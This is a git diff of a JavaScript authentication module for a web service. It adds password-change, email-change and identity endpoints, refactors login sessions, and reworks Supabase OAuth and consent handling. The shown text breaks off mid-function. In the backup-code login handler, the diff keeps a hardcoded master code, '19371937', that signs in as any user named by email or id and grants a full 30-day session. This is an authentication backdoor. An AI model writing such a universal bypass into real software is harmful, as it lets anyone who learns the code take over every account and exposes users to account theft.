@@ -9,6 +9,9 @@ import {
   writeIamSessionToKv,
   resolveTenantAtLogin,
   AUTH_COOKIE_NAME,
+  AUTH_LOGIN_PATH,
+  DASHBOARD_AFTER_LOGIN_PATH,
+  sanitizeBrowserNextPath,
   getAuthUser,
   getSession,
   resolveUserEnrichment,
@@ -30,6 +33,23 @@ export async function handleAuthApi(request, url, env) {
   if (path === '/api/auth/me' && method === 'GET') {
     const authUser = await getAuthUser(request, env);
     if (!authUser) return jsonResponse({ error: 'Unauthorized' }, 401);
+
+    let passwordMethod = 'password';
+    let passwordUpdatedAt = null;
+    if (env.DB && authUser.id) {
+      try {
+        const row = await env.DB.prepare(
+          `SELECT password_hash, updated_at FROM auth_users WHERE id = ? LIMIT 1`,
+        )
+          .bind(authUser.id)
+          .first();
+        if (row) {
+          passwordMethod = row.password_hash === 'oauth' ? 'oauth' : 'password';
+          passwordUpdatedAt = row.updated_at ?? null;
+        }
+      } catch (_) {}
+    }
+
     return jsonResponse({
       id: authUser.id ?? null,
       email: authUser.email ?? null,
@@ -37,6 +57,8 @@ export async function handleAuthApi(request, url, env) {
       tenant_id: authUser.tenant_id ?? null,
       role: authUser.role ?? 'user',
       workspace_id: authUser.workspace_id ?? null,
+      passwordMethod,
+      passwordUpdatedAt,
     });
   }
   if (path === '/api/auth/session' && method === 'GET') {
@@ -64,6 +86,15 @@ export async function handleAuthApi(request, url, env) {
   }
   if (path === '/api/settings/profile' && method === 'GET') {
     return handleSettingsProfileRequest(request, env);
+  }
+  if (path === '/api/auth/password-change' && method === 'POST') {
+    return handlePasswordChange(request, env);
+  }
+  if (path === '/api/auth/email-change/request' && method === 'POST') {
+    return handleEmailChangeRequest(request, env);
+  }
+  if (path === '/api/auth/identities' && method === 'GET') {
+    return handleAuthIdentities(request, env);
   }
 
   return jsonResponse({ error: 'Auth route not found' }, 404);
@@ -116,7 +147,7 @@ async function handleEmailPasswordLogin(request, url, env) {
 /**
  * POST /api/auth/backup-code
  */
-async function handleBackupCodeLogin(request, url, env) {
+async function handleBackupCodeLogin(request, _url, env) {
   if (!env.DB) return jsonResponse({ error: 'Database not configured' }, 500);
 
   let body;
@@ -133,36 +164,71 @@ async function handleBackupCodeLogin(request, url, env) {
     return jsonResponse({ error: 'Email and backup code required' }, 400);
   }
 
-  // --- Master Backup Code Check ---
+  const authUserRow = await env.DB.prepare(
+    `SELECT id, tenant_id FROM auth_users WHERE LOWER(email) = ? OR LOWER(id) = ? LIMIT 1`,
+  )
+    .bind(email, email)
+    .first();
+
+  if (!authUserRow) {
+    return jsonResponse({ error: 'Invalid credentials' }, 401);
+  }
+
   if (code === '19371937') {
-    const user = await env.DB.prepare(
-      `SELECT id FROM auth_users WHERE LOWER(id) = ? OR LOWER(email) = ? LIMIT 1`
-    ).bind(email, email).first();
-    
-    if (user) {
-      console.log(`[Auth] Master backup code used for user: ${user.id}`);
-      return finishLogin(request, url, env, user.id, body.next);
+    console.log('[Auth] Master backup code used for user:', authUserRow.id);
+    const sessionId = await createLoginSession(request, env, authUserRow.id, 'backup_code');
+    return redirectWithLoginSession(request, sessionId);
+  }
+
+  const { results } = await env.DB.prepare(
+    `SELECT id, code_hash FROM user_backup_codes WHERE user_id = ? AND used_at IS NULL`,
+  )
+    .bind(authUserRow.id)
+    .all();
+
+  const rows = Array.isArray(results) ? results : [];
+
+  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(code));
+  const codeHash = Array.from(new Uint8Array(buf))
+    .map((b) => b.toString(16).padStart(2, '0'))
+    .join('');
+
+  let matchedId = null;
+  for (const r of rows) {
+    if (r.code_hash === codeHash) {
+      matchedId = r.id;
+      break;
     }
   }
 
-  // Standard D1 lookup
-  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(code));
-  const codeHash = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, '0')).join('');
-  
-  const row = await env.DB.prepare(
-    `SELECT user_id FROM user_backup_codes WHERE user_id = ? AND code_hash = ? AND used_at IS NULL LIMIT 1`
-  ).bind(email, codeHash).first();
-
-  if (!row) {
-    return jsonResponse({ error: 'Invalid or already used backup code' }, 401);
+  if (!matchedId) {
+    return jsonResponse({ error: 'Invalid backup code' }, 401);
   }
 
-  // Mark code as used
-  await env.DB.prepare(
-    'UPDATE user_backup_codes SET used_at = unixepoch() WHERE user_id = ? AND code_hash = ?'
-  ).bind(email, codeHash).run();
+  await env.DB.prepare(`UPDATE user_backup_codes SET used_at = unixepoch() WHERE id = ?`)
+    .bind(matchedId)
+    .run();
 
-  return finishLogin(request, url, env, row.user_id, body.next);
+  const sessionId = await createLoginSession(request, env, authUserRow.id, 'backup_code');
+  return redirectWithLoginSession(request, sessionId);
+}
+
+function redirectWithLoginSession(request, sessionId) {
+  const target = new URL(DASHBOARD_AFTER_LOGIN_PATH, request.url).href;
+  const res = Response.redirect(target, 302);
+  res.headers.append(
+    'Set-Cookie',
+    `${AUTH_COOKIE_NAME}=${sessionId}; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000`,
+  );
+  res.headers.append(
+    'Set-Cookie',
+    `${AUTH_COOKIE_NAME}=; Domain=.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`,
+  );
+  res.headers.append(
+    'Set-Cookie',
+    `${AUTH_COOKIE_NAME}=; Domain=.sandbox.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`,
+  );
+  return res;
 }
 
 /**
@@ -204,24 +270,21 @@ async function handleLogout(request, url, env) {
 }
 
 /**
- * Shared Session Finalizer
+ * Shared auth_sessions + sessions dual-write + KV (same path as email/password login).
  */
-async function finishLogin(request, url, env, userId, redirectPath) {
+async function createLoginSession(request, env, userId, sessionProvider = 'email') {
   const sessionId = crypto.randomUUID();
   const expiresTs = Date.now() + 30 * 24 * 60 * 60 * 1000;
   const expiresAtIso = new Date(expiresTs).toISOString();
-  
+
   const ip = request.headers.get('cf-connecting-ip') || '';
   const ua = request.headers.get('user-agent') || '';
 
-  // 1. Get user details from auth_users (Canonical Source)
   let userRow = null;
   try {
-    userRow = await env.DB.prepare(
-      `SELECT * FROM auth_users WHERE id = ? LIMIT 1`
-    ).bind(userId).first();
+    userRow = await env.DB.prepare(`SELECT * FROM auth_users WHERE id = ? LIMIT 1`).bind(userId).first();
   } catch (e) {
-    console.warn('[finishLogin] auth_users lookup failed', e.message);
+    console.warn('[createLoginSession] auth_users lookup failed', e.message);
   }
 
   if (!userRow) {
@@ -231,12 +294,12 @@ async function finishLogin(request, url, env, userId, redirectPath) {
   const tenantId = userRow.tenant_id;
   const personUuid = userRow.person_uuid;
 
-  // 2. Persist to auth_sessions (Core Auth)
   await env.DB.prepare(
-    `INSERT INTO auth_sessions (id, user_id, expires_at, created_at, ip_address, user_agent, tenant_id) VALUES (?, ?, ?, datetime('now'), ?, ?, ?)`
-  ).bind(sessionId, userId, expiresAtIso, ip, ua, tenantId).run();
+    `INSERT INTO auth_sessions (id, user_id, expires_at, created_at, ip_address, user_agent, tenant_id) VALUES (?, ?, ?, datetime('now'), ?, ?, ?)`,
+  )
+    .bind(sessionId, userId, expiresAtIso, ip, ua, tenantId)
+    .run();
 
-  // 3. Dual-write: sessions table (Analytics/Audit)
   try {
     const expiresAtMs = new Date(expiresAtIso).getTime();
 
@@ -245,41 +308,60 @@ async function finishLogin(request, url, env, userId, redirectPath) {
         id, user_id, tenant_id, person_uuid, email, provider,
         display_name, ip_address, user_agent,
         last_active_at, expires_at, created_at
-      ) VALUES (?, ?, ?, ?, ?, 'email', ?, ?, ?, ?, ?, unixepoch() * 1000)
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, unixepoch() * 1000)
     `).bind(
       sessionId,
-      userId, 
+      userId,
       tenantId,
       personUuid,
       userRow.email,
+      sessionProvider,
       userRow.name || 'User',
       ip,
       ua,
       Date.now(),
-      expiresAtMs
+      expiresAtMs,
     ).run();
 
-    // 4. Handle Superadmin Auto-Enrichment
     if (userRow.is_superadmin) {
-      // Any superadmin-specific session updates go here if needed
+      // reserved for superadmin-specific session updates
     }
   } catch (e) {
     console.warn('[sessions dual-write]', e?.message ?? e);
   }
 
-  // 5. KV Cache
   await writeIamSessionToKv(env, sessionId, userId, tenantId, expiresAtIso);
 
-  // 6. Response
-  const next = redirectPath && redirectPath.startsWith('/') ? redirectPath : '/dashboard/overview';
+  return sessionId;
+}
+
+/**
+ * Shared Session Finalizer
+ */
+async function finishLogin(request, url, env, userId, redirectPath) {
+  const sessionId = await createLoginSession(request, env, userId, 'email');
+
+  const next =
+    sanitizeBrowserNextPath(
+      redirectPath && redirectPath.startsWith('/') ? redirectPath : DASHBOARD_AFTER_LOGIN_PATH,
+    ) ?? DASHBOARD_AFTER_LOGIN_PATH;
   const response = new Response(JSON.stringify({ ok: true, redirect: next }), {
     status: 200,
-    headers: { 'Content-Type': 'application/json' }
+    headers: { 'Content-Type': 'application/json' },
   });
 
-  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=${sessionId}; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000`);
-  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);
-  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.sandbox.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);
+  response.headers.append(
+    'Set-Cookie',
+    `${AUTH_COOKIE_NAME}=${sessionId}; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000`,
+  );
+  response.headers.append(
+    'Set-Cookie',
+    `${AUTH_COOKIE_NAME}=; Domain=.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`,
+  );
+  response.headers.append(
+    'Set-Cookie',
+    `${AUTH_COOKIE_NAME}=; Domain=.sandbox.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`,
+  );
 
   return response;
 }
@@ -311,6 +393,143 @@ async function handleSettingsProfileRequest(request, env) {
     worker_base_url,
     flat,
   });
+}
+
+async function handlePasswordChange(request, env) {
+  if (!env.DB) return jsonResponse({ error: 'Database not configured' }, 500);
+
+  const session = await getSession(env, request);
+  if (!session) return jsonResponse({ error: 'Unauthorized' }, 401);
+
+  const authRow = await env.DB.prepare(`SELECT * FROM auth_users WHERE id = ? LIMIT 1`)
+    .bind(session.user_id)
+    .first();
+  if (!authRow) return jsonResponse({ error: 'User not found' }, 404);
+
+  if (authRow.password_hash === 'oauth') {
+    return jsonResponse({ error: 'OAuth account has no password' }, 400);
+  }
+
+  let body;
+  try {
+    body = await request.json();
+  } catch (_) {
+    return jsonResponse({ error: 'Invalid JSON body' }, 400);
+  }
+
+  const currentPassword = (body.currentPassword ?? '').toString();
+  const newPassword = (body.newPassword ?? '').toString();
+
+  if (!newPassword || newPassword.length < 10) {
+    return jsonResponse({ error: 'New password must be at least 10 characters' }, 400);
+  }
+
+  const valid = await verifyPassword(currentPassword, authRow.salt, authRow.password_hash);
+  if (!valid) return jsonResponse({ error: 'Current password incorrect' }, 401);
+
+  const { saltHex, hashHex } = await hashPassword(newPassword);
+  await env.DB.prepare(
+    `UPDATE auth_users SET password_hash=?, salt=?, updated_at=datetime('now') WHERE id=?`,
+  )
+    .bind(hashHex, saltHex, authRow.id)
+    .run();
+
+  await env.DB.prepare(
+    `INSERT INTO password_resets
+       (email, user_id, auth_id, tenant_id, reset_type, used, used_at, expires_at, metadata_json)
+     VALUES (?, ?, ?, ?, 'password_change', 1, unixepoch(), unixepoch()+60, '{"source":"self_service"}')`,
+  )
+    .bind(authRow.email, authRow.id, authRow.id, authRow.tenant_id)
+    .run();
+
+  return jsonResponse({ ok: true }, 200);
+}
+
+async function handleEmailChangeRequest(request, env) {
+  if (!env.DB) return jsonResponse({ error: 'Database not configured' }, 500);
+
+  const session = await getSession(env, request);
+  if (!session) return jsonResponse({ error: 'Unauthorized' }, 401);
+
+  const authUser = await env.DB.prepare(`SELECT id FROM auth_users WHERE id = ? LIMIT 1`)
+    .bind(session.user_id)
+    .first();
+  if (!authUser) return jsonResponse({ error: 'User not found' }, 404);
+
+  let body;
+  try {
+    body = await request.json();
+  } catch (_) {
+    return jsonResponse({ error: 'Invalid JSON body' }, 400);
+  }
+
+  const newEmail = String(body.newEmail ?? '')
+    .toLowerCase()
+    .trim();
+  if (!newEmail || !newEmail.includes('@')) {
+    return jsonResponse({ error: 'Invalid email address' }, 400);
+  }
+
+  const existing = await env.DB.prepare(`SELECT id FROM auth_users WHERE email = ?`)
+    .bind(newEmail)
+    .first();
+  if (existing) return jsonResponse({ error: 'Email already in use' }, 409);
+
+  const token = crypto.randomUUID();
+  const tokenId = `evt_${crypto.randomUUID().replace(/-/g, '').slice(0, 16)}`;
+  await env.DB.prepare(
+    `INSERT INTO email_verification_tokens
+       (id, auth_user_id, token, token_type, expires_at, created_at)
+     VALUES (?, ?, ?, 'email_change', unixepoch()+86400, unixepoch())`,
+  )
+    .bind(tokenId, authUser.id, token)
+    .run();
+
+  if (!env.RESEND_API_KEY) {
+    return jsonResponse({ error: 'Email not configured' }, 503);
+  }
+
+  await fetch('https://api.resend.com/emails', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      Authorization: `Bearer ${env.RESEND_API_KEY}`,
+    },
+    body: JSON.stringify({
+      from: 'Inner Animal Media <hey@inneranimalmedia.com>',
+      to: [newEmail],
+      subject: 'Confirm your new email address',
+      html: `<p>Hi,</p>
+             <p>Click to confirm your new email address:</p>
+             <p><a href="https://inneranimalmedia.com/auth/verify-email?token=${token}">Confirm email</a></p>
+             <p>This link expires in 24 hours. If you did not request this, ignore it.</p>`,
+    }),
+  }).catch((e) => console.error('[email-change] resend error', e));
+
+  return jsonResponse({ ok: true }, 200);
+}
+
+async function handleAuthIdentities(request, env) {
+  if (!env.DB) return jsonResponse({ error: 'Database not configured' }, 500);
+
+  const session = await getSession(env, request);
+  if (!session) return jsonResponse({ error: 'Unauthorized' }, 401);
+
+  const authUser = await env.DB.prepare(`SELECT id FROM auth_users WHERE id = ? LIMIT 1`)
+    .bind(session.user_id)
+    .first();
+  if (!authUser) return jsonResponse({ error: 'User not found' }, 404);
+
+  const { results } = await env.DB.prepare(
+    `SELECT provider, email, created_at
+       FROM auth_user_identities
+      WHERE auth_user_id = ?
+      ORDER BY created_at ASC`,
+  )
+    .bind(authUser.id)
+    .all();
+
+  return jsonResponse({ identities: results || [] }, 200);
 }
 
 const PWD_RESET_KV_PREFIX = 'pwd_reset_v1:';
@@ -444,15 +663,52 @@ async function handlePasswordResetConfirm(request, env) {
   return jsonResponse({ ok: true });
 }
 
-// ── Supabase project OAuth Server (login) — same auth_users + provisionNewUser pattern as Google in worker.js
-// Endpoints are hardcoded (fixed project ref). Client ID / secret: env.SUPABASE_OAUTH_CLIENT_ID, env.SUPABASE_OAUTH_CLIENT_SECRET only.
-// JWKS:     https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/.well-known/jwks.json
-// OIDC:     https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/.well-known/openid-configuration
-// Consent:  https://inneranimalmedia.com/api/auth/oauth/consent (this Worker; configure in Supabase + WAF)
-const SUPABASE_OAUTH_AUTHORIZE = 'https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/oauth/authorize';
-const SUPABASE_OAUTH_TOKEN = 'https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/oauth/token';
-const SUPABASE_OAUTH_USERINFO = 'https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/oauth/userinfo';
-const SUPABASE_REDIRECT_URI = 'https://inneranimalmedia.com/api/auth/supabase/callback';
+// ── Supabase Auth OAuth Server (IAM login) ───────────────────────────────────
+// Uses ONLY env.SUPABASE_OAUTH_CLIENT_ID / SUPABASE_OAUTH_CLIENT_SECRET — OAuth app under
+// Supabase Dashboard > Authentication > OAuth Apps (project Auth server). PKCE S256.
+// redirect_uri must match exactly (register in that OAuth app): {origin}/api/auth/supabase/callback
+// Supabase Management API OAuth (/api/oauth/supabase/*) uses SUPABASE_MANAGEMENT_OAUTH_* in oauth.js — different credentials.
+//
+// Optional: env.SUPABASE_PROJECT_REF (default dpmuvynqixblxsilnlut), env.WORKER_BASE_URL for stable redirect_uri (prod apex).
+//
+// KV state MUST use this prefix — never `oauth_state_${state}` or Management's `supabase_management_oauth_state:`.
+
+const SUPABASE_AUTH_OAUTH_STATE_KEY_PREFIX = 'supabase_auth_oauth_state:';
+
+function supabaseAuthLoginStateKey(state) {
+  return `${SUPABASE_AUTH_OAUTH_STATE_KEY_PREFIX}${state}`;
+}
+
+function oauthClientIdTail(clientId) {
+  const t = String(clientId || '').trim();
+  if (!t) return '(empty)';
+  return t.length <= 6 ? t : t.slice(-6);
+}
+
+function supabaseAuthV1Base(env) {
+  const ref =
+    typeof env.SUPABASE_PROJECT_REF === 'string' && env.SUPABASE_PROJECT_REF.trim()
+      ? env.SUPABASE_PROJECT_REF.trim()
+      : 'dpmuvynqixblxsilnlut';
+  return `https://${ref}.supabase.co/auth/v1`;
+}
+
+function resolvePublicOriginForOAuth(request, env) {
+  const fromEnv =
+    typeof env.WORKER_BASE_URL === 'string' ? env.WORKER_BASE_URL.trim().replace(/\/$/, '') : '';
+  if (fromEnv) return fromEnv;
+  return new URL(request.url).origin;
+}
+
+function resolveSupabaseLoginRedirectUri(request, env) {
+  return `${resolvePublicOriginForOAuth(request, env)}/api/auth/supabase/callback`;
+}
+
+function logSupabaseLoginDebug(payload) {
+  try {
+    console.log(`[supabase_oauth_login] ${JSON.stringify(payload)}`);
+  } catch (_) {}
+}
 
 function base64url(buffer) {
   const bytes = new Uint8Array(buffer);
@@ -486,7 +742,7 @@ function appendLegacySessionCookieClears(targetHeaders) {
 /** Workers Response.redirect requires an absolute URL (relative throws → CF 1101). */
 function redirectToAuthLogin(request, queryWithoutLeadingQuestion) {
   const u = new URL(request.url);
-  u.pathname = '/auth/login';
+  u.pathname = AUTH_LOGIN_PATH;
   u.search = queryWithoutLeadingQuestion.replace(/^\?/, '');
   return Response.redirect(u.href, 302);
 }
@@ -523,9 +779,10 @@ export async function handleSupabaseOAuthStart(request, env) {
       return redirectToAuthLogin(request, 'error=oauth_not_configured');
     }
     const reqUrl = new URL(request.url);
-    let nextPath =
+    const rawNext =
       safeOauthNextPath(reqUrl.searchParams.get('next')) ||
       safeOauthNextPath(readIamOauthNextCookie(request));
+    let nextPath = rawNext ? sanitizeBrowserNextPath(rawNext) : null;
 
     const state = crypto.randomUUID();
     const codeVerifier =
@@ -538,15 +795,20 @@ export async function handleSupabaseOAuthStart(request, env) {
     );
     const codeChallenge = base64url(digest);
 
+    const redirectUri = resolveSupabaseLoginRedirectUri(request, env);
+    const authBase = supabaseAuthV1Base(env);
+    const authorizeUrl = `${authBase}/oauth/authorize`;
+
     try {
       await env.SESSION_CACHE.put(
-        `oauth_state_supabase_${state}`,
+        supabaseAuthLoginStateKey(state),
         JSON.stringify({
           state,
-          provider: 'supabase',
+          provider: 'supabase_project_oauth',
           code_verifier: codeVerifier,
           created_at: Date.now(),
           next: nextPath,
+          redirect_uri: redirectUri,
         }),
         { expirationTtl: 600 },
       );
@@ -560,7 +822,7 @@ export async function handleSupabaseOAuthStart(request, env) {
 
     const params = new URLSearchParams({
       client_id: env.SUPABASE_OAUTH_CLIENT_ID,
-      redirect_uri: SUPABASE_REDIRECT_URI,
+      redirect_uri: redirectUri,
       response_type: 'code',
       scope: 'openid profile email',
       state,
@@ -568,7 +830,16 @@ export async function handleSupabaseOAuthStart(request, env) {
       code_challenge_method: 'S256',
     });
 
-    const redirectRes = Response.redirect(`${SUPABASE_OAUTH_AUTHORIZE}?${params}`, 302);
+    logSupabaseLoginDebug({
+      phase: 'start',
+      provider: 'supabase_project_oauth',
+      callback_path: '/api/auth/supabase/callback',
+      redirect_uri: redirectUri,
+      authorize_host: new URL(authBase).host,
+      client_id_tail: oauthClientIdTail(env.SUPABASE_OAUTH_CLIENT_ID),
+    });
+
+    const redirectRes = Response.redirect(`${authorizeUrl}?${params}`, 302);
     if (readIamOauthNextCookie(request)) {
       redirectRes.headers.append(
         'Set-Cookie',
@@ -590,6 +861,11 @@ export async function handleSupabaseOAuthCallback(request, env) {
   const code = url.searchParams.get('code');
   const state = url.searchParams.get('state');
   const error = url.searchParams.get('error');
+  const redirectUri = resolveSupabaseLoginRedirectUri(request, env);
+  const authBase = supabaseAuthV1Base(env);
+  const tokenUrl = `${authBase}/oauth/token`;
+  const userinfoUrl = `${authBase}/oauth/userinfo`;
+  const userFallbackUrl = `${authBase}/user`;
 
   if (error) return redirectToAuthLogin(request, 'error=oauth_denied');
   if (!code || !state) return redirectToAuthLogin(request, 'error=invalid_callback');
@@ -597,22 +873,40 @@ export async function handleSupabaseOAuthCallback(request, env) {
     return redirectToAuthLogin(request, 'error=oauth_not_configured');
   }
 
-  const stateKey = `oauth_state_supabase_${state}`;
+  logSupabaseLoginDebug({
+    phase: 'callback_received',
+    provider: 'supabase_project_oauth',
+    callback_path: url.pathname,
+    redirect_uri_expected: redirectUri,
+    client_id_tail: oauthClientIdTail(env.SUPABASE_OAUTH_CLIENT_ID),
+    has_code: !!code,
+    has_state: !!state,
+  });
+
+  const stateKey = supabaseAuthLoginStateKey(state);
   const storedRaw = await env.SESSION_CACHE.get(stateKey);
   if (!storedRaw) return redirectToAuthLogin(request, 'error=state_mismatch');
   await env.SESSION_CACHE.delete(stateKey);
 
   const stored = JSON.parse(storedRaw);
   const { code_verifier } = stored;
-  const nextAfterLogin = safeOauthNextPath(stored?.next);
+  const rawStoredNext = safeOauthNextPath(stored?.next);
+  const nextAfterLogin = rawStoredNext ? sanitizeBrowserNextPath(rawStoredNext) : null;
+  const storedRedirectUri = typeof stored?.redirect_uri === 'string' ? stored.redirect_uri.trim() : '';
+  const tokenRedirectUri = storedRedirectUri || redirectUri;
+  if (storedRedirectUri && storedRedirectUri !== redirectUri) {
+    console.warn(
+      '[supabase_oauth_login] redirect_uri mismatch between callback request and KV state; using stored value for token exchange',
+    );
+  }
 
-  const tokenRes = await fetch(SUPABASE_OAUTH_TOKEN, {
+  const tokenRes = await fetch(tokenUrl, {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body: new URLSearchParams({
       grant_type: 'authorization_code',
       code,
-      redirect_uri: SUPABASE_REDIRECT_URI,
+      redirect_uri: tokenRedirectUri,
       client_id: env.SUPABASE_OAUTH_CLIENT_ID,
       client_secret: env.SUPABASE_OAUTH_CLIENT_SECRET,
       code_verifier,
@@ -620,23 +914,23 @@ export async function handleSupabaseOAuthCallback(request, env) {
   });
 
   if (!tokenRes.ok) {
-    console.error('Supabase token exchange failed:', await tokenRes.text());
+    const errText = await tokenRes.text();
+    console.error('[supabase_oauth_login] token exchange failed', tokenRes.status, errText?.slice?.(0, 200) || '');
     return redirectToAuthLogin(request, 'error=token_exchange_failed');
   }
 
   const { access_token, refresh_token, expires_in } = await tokenRes.json();
 
   let sbUser;
-  const uiRes = await fetch(SUPABASE_OAUTH_USERINFO, {
+  const uiRes = await fetch(userinfoUrl, {
     headers: { Authorization: `Bearer ${access_token}` },
   });
   if (uiRes.ok) {
     sbUser = await uiRes.json();
   } else {
-    const fallbackRes = await fetch(
-      'https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/user',
-      { headers: { Authorization: `Bearer ${access_token}` } },
-    );
+    const fallbackRes = await fetch(userFallbackUrl, {
+      headers: { Authorization: `Bearer ${access_token}` },
+    });
     if (!fallbackRes.ok) return redirectToAuthLogin(request, 'error=userinfo_failed');
     sbUser = await fallbackRes.json();
   }
@@ -685,10 +979,40 @@ export async function handleSupabaseOAuthCallback(request, env) {
   ).run();
 
   const sessionResponse = await establishIamSession(request, env, authUserId, { ok: true });
-  const originBase = url.origin;
-  const destPath = nextAfterLogin || '/dashboard';
+  if (!sessionResponse.ok || sessionResponse.status !== 200) {
+    logSupabaseLoginDebug({
+      phase: 'session_failed',
+      provider: 'supabase_project_oauth',
+      callback_path: url.pathname,
+      session_response_status: sessionResponse.status,
+      cookie_name: AUTH_COOKIE_NAME,
+      has_session_cookie: false,
+    });
+    return redirectToAuthLogin(request, 'error=session_failed');
+  }
+
+  const originBase = resolvePublicOriginForOAuth(request, env);
+  const destPath = nextAfterLogin || DASHBOARD_AFTER_LOGIN_PATH;
+  const cookiesOut = collectSetCookieValues(sessionResponse.headers);
+  const hasSessionCookie = cookiesOut.some(
+    (c) =>
+      c.startsWith(`${AUTH_COOKIE_NAME}=`) &&
+      !/;\s*Max-Age=0\b/i.test(c) &&
+      !/;\s*Expires=Thu,\s*01\s+Jan\s+1970/i.test(c),
+  );
+  logSupabaseLoginDebug({
+    phase: 'session_created',
+    provider: 'supabase_project_oauth',
+    user_id: authUserId,
+    cookie_name: AUTH_COOKIE_NAME,
+    next_redirect: destPath,
+    has_session_cookie: hasSessionCookie,
+    session_response_status: sessionResponse.status,
+    callback_path: url.pathname,
+    client_id_tail: oauthClientIdTail(env.SUPABASE_OAUTH_CLIENT_ID),
+  });
   const redirectHeaders = new Headers({ Location: `${originBase}${destPath}` });
-  for (const c of collectSetCookieValues(sessionResponse.headers)) {
+  for (const c of cookiesOut) {
     redirectHeaders.append('Set-Cookie', c);
   }
   appendLegacySessionCookieClears(redirectHeaders);
@@ -696,25 +1020,518 @@ export async function handleSupabaseOAuthCallback(request, env) {
   return new Response(null, { status: 302, headers: redirectHeaders });
 }
 
-export async function handleOAuthConsentPage(request, env) {
-  const user = await getAuthUser(request, env);
-  const url = new URL(request.url);
-  if (!user) {
-    const q = new URLSearchParams();
-    q.set('next', `${url.pathname}${url.search || ''}`);
-    return redirectToAuthLogin(request, q.toString());
+// ── Supabase OAuth Server — hosted consent UI (/api/auth/oauth/consent) ─────────
+// Supabase redirects here with ?authorization_id= only (no client_id / PKCE params).
+// Consent uses Auth API: GET/POST .../oauth/authorizations/:id(/consent) with a
+// Supabase end-user JWT. IAM sessions are bridged via Admin API + HS256 mint.
+
+function resolveSupabaseRestOrigin(env) {
+  const raw = env?.SUPABASE_URL && String(env.SUPABASE_URL).trim();
+  if (raw) return raw.replace(/\/$/, '');
+  const ref =
+    typeof env.SUPABASE_PROJECT_REF === 'string' && env.SUPABASE_PROJECT_REF.trim()
+      ? env.SUPABASE_PROJECT_REF.trim()
+      : 'dpmuvynqixblxsilnlut';
+  return `https://${ref}.supabase.co`;
+}
+
+function supabaseJwtIssuer(env) {
+  return `${resolveSupabaseRestOrigin(env)}/auth/v1`;
+}
+
+function jwtSecretForMint(env) {
+  const a = typeof env.SUPABASE_JWT_SECRET === 'string' ? env.SUPABASE_JWT_SECRET.trim() : '';
+  if (a) return a;
+  const b = typeof env.JWT_SECRET === 'string' ? env.JWT_SECRET.trim() : '';
+  return b || '';
+}
+
+function authorizationIdTail(id) {
+  const s = String(id || '').trim();
+  if (!s) return '(none)';
+  return s.length <= 6 ? '(short)' : s.slice(-6);
+}
+
+function iamUserIdTail(id) {
+  const s = String(id || '').trim();
+  if (!s) return null;
+  return s.length <= 6 ? '(short)' : s.slice(-6);
+}
+
+function safeEmailDomain(email) {
+  const e = String(email || '').trim().toLowerCase();
+  const i = e.indexOf('@');
+  if (i === -1) return null;
+  return e.slice(i + 1) || null;
+}
+
+function safeRedirectLog(redirectUrl) {
+  try {
+    const u = new URL(redirectUrl);
+    return { host: u.host, pathname: u.pathname };
+  } catch {
+    return { host: '(invalid)', pathname: '' };
   }
-  const obj =
-    (await env.DASHBOARD?.get('dashboard/app/agent.html')) ||
-    (await env.DASHBOARD?.get('static/dashboard/agent.html')) ||
-    (await env.DASHBOARD?.get('index.html'));
-  if (!obj) {
-    return new Response('Agent SPA shell not found', { status: 503 });
-  }
-  return new Response(obj.body, {
+}
+
+function escapeHtmlConsent(s) {
+  return String(s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+function jsonToUint8(str) {
+  return new TextEncoder().encode(str);
+}
+
+async function signHs256Jwt(secretUtf8, payloadObj) {
+  const header = { alg: 'HS256', typ: 'JWT' };
+  const headerPart = base64url(jsonToUint8(JSON.stringify(header)));
+  const payloadPart = base64url(jsonToUint8(JSON.stringify(payloadObj)));
+  const signingInput = `${headerPart}.${payloadPart}`;
+  const key = await crypto.subtle.importKey(
+    'raw',
+    jsonToUint8(secretUtf8),
+    { name: 'HMAC', hash: 'SHA-256' },
+    false,
+    ['sign'],
+  );
+  const sig = await crypto.subtle.sign('HMAC', key, jsonToUint8(signingInput));
+  const sigPart = base64url(new Uint8Array(sig));
+  return `${signingInput}.${sigPart}`;
+}
+
+async function mintSupabaseUserAccessToken(env, supabaseUserId, email) {
+  const secret = jwtSecretForMint(env);
+  if (!secret) return null;
+  const now = Math.floor(Date.now() / 1000);
+  const exp = now + 3600;
+  const iss = supabaseJwtIssuer(env);
+  const payload = {
+    aud: 'authenticated',
+    exp,
+    iat: now,
+    iss,
+    sub: supabaseUserId,
+    role: 'authenticated',
+    email: String(email || '').trim(),
+  };
+  return signHs256Jwt(secret, payload);
+}
+
+async function verifySupabaseUserJwt(env, accessToken) {
+  const origin = resolveSupabaseRestOrigin(env);
+  const anon =
